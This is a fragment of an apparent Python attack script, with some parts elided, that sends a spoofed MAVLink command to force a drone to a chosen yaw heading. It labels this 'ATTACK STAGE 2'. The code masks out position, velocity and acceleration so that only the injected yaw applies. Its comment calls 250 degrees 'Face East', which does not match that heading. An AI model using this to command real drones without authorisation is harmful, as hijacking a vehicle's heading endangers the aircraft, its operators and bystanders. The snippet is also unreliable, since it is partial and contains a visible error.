...
ATTACK_YAW_DEGREES = 250 # Face East
# Convert to radians for the MAVLink command
...
# --- STAGE 2:
print(f"\n!!! ATTACK STAGE 2: Sending YAW-ONLY spoof command (Yaw: {ATTACK_YAW_DEGREES} deg) !!!")
master.mav.set_position_target_global_int_send(
    ...
    0b0000101111111111, # type_mask (Decimal: 3071). IGNORE_POS, IGNORE_VEL, IGNORE_ACCEL
    ...
    # --- THESE ARE USED ---
    ATTACK_YAW_RADIANS, # yaw (THIS IS USED)
    0)                  # yaw_rate (ignored)

print(f"Attack commands sent! Drone should be turning to {ATTACK_YAW_DEGREES} degrees")
